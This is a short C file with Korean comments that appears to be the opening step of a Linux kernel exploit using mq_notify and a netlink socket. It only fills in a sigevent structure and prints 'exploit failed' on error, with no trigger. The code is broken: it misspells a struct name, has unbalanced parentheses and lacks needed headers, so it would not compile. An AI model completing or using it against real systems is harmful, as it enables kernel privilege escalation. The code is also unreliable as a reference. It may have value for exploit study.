// gcc -o test test.c -O0 -pthread
#include <stdio.h>
#include <signal.h>
#include <errno.h>
#include <sys/socket.h>
#include <mqueue.h>
#include <linux/netlink.h>


#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
#define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)


#define NOTIFY_COOKIE_LEN 32 

int main(void)
{

    /*
        1. 전달할 인자를 세팅한다 sigevent 객체 
            - sigev_signo = AF_NETLINK 타입 소켓 fd 
            - sigev_notify = SIGEV_THREAD 
            - sigev_value.sival_ptr = buffer[NOTIFY_COOKIE_LEN(32)]
        2. library wrapper 를 피하기 위해 syscall 을 직접 호출한다 
            - #define _mq_notigy(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
    */

    int sock_fd;
    struct sigevnet sigev;
    char sival_buffer[NOTIFY_COOKIE_LEN];

    if((sock_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK) < 0) {
        perror("socket");
        goto fail;
    }

    memset(&sigev, 0, sizeof(sigev));
    sigev.sigev_signo = sock_fd;
    sigev.sigev_notify = SIGEV_THREAD;
    sigev.sigev_value.sival_ptr = sival_buffer;


    return 0;

fail:
    printf("[-] exploit failed!\n");
    return -1;
}